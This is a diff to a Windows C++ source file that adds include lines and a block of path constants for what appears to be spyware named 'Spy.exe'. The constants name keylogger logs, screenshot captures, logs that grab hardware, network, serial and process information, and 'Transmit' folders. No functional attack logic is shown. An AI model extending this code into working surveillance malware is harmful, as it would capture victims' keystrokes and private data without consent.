@@ -9,6 +9,7 @@
 #include <map>
 #include <gdiplus.h>
 #include <direct.h>
+#include <string>
 #pragma warning(disable : 4996)
 #pragma comment(lib,"wsock32.lib")
 #pragma comment(lib, "pthreadVSE2.lib")
@@ -16,6 +17,28 @@
 #pragma comment(lib, "GdiPlus.lib")
 using namespace std;
 using namespace Gdiplus;
+
+#define library "pthreadVSE2.dll"
+#define spy "Spy.exe"
+#define logpath "SpyLog//Spy.txt"
+#define configuration "Config.ksb"
+#define loghw "GrabberLog//HardwareLog.txt"
+#define logsc "GrabberLog//SampleSrviceConfigLog.txt"
+#define logsi "GrabberLog//SystemInfoLog.txt"
+#define logni "GrabberLog//NetworkInformationLog.txt"
+#define loges "GrabberLog//SerialLog.txt"
+#define logsp "GrabberLog//ScanProcessLog.txt"
+#define logkl "KeyloggerLog//KeyloggerLog.txt"
+#define schname "ScreenshooterLog//ScreenShoot"
+#define gfolder "GrabberLog"
+#define klfolder "KeyloggerLog"
+#define schfolder "ScreenshooterLog"
+#define spyfolder "SpyLog"
+#define transmit "Transmit"
+#define finish "Transmit//finish"
+#define request "Transmit//request"
+#define confirm "Transmit//confirm"
+
 
 struct control
 {
